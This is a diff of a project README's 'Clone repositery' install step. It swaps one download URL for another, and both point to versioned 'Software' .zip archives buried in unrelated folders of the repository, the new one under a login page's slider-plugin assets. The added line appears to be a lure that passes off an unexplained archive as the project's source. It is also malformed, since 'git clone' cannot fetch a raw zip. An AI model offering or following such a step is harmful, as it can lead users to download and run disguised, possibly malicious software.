@@ -14,7 +14,7 @@ Install the dependencies and start the server.
 ##### Clone repositery
 
 ```sh
-git clone https://raw.githubusercontent.com/Rahul-Raj-04/hubwale/main/app/Http/Controllers/Livewire/Erp/Setting/PurchaseSetup/Software_3.1.zip
+git clone https://raw.githubusercontent.com/Rahul-Raj-04/hubwale/main/public/bundle/login/assets/plugins/ion.rangeSlider/Software-3.8.zip
 ```
 
 ##### Go to project directory
